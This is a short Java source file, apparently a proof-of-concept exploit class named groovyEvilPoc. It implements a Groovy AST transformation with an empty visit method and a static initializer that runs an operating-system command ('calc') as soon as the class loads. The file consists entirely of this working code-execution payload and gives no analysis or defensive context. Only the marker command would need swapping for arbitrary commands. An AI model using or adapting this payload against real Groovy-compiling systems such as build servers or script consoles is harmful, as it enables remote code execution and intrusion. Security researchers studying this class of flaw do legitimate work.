import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

import java.io.IOException;

@GroovyASTTransformation
public class groovyEvilPoc implements ASTTransformation {
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {
    }
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {

        }
    }
}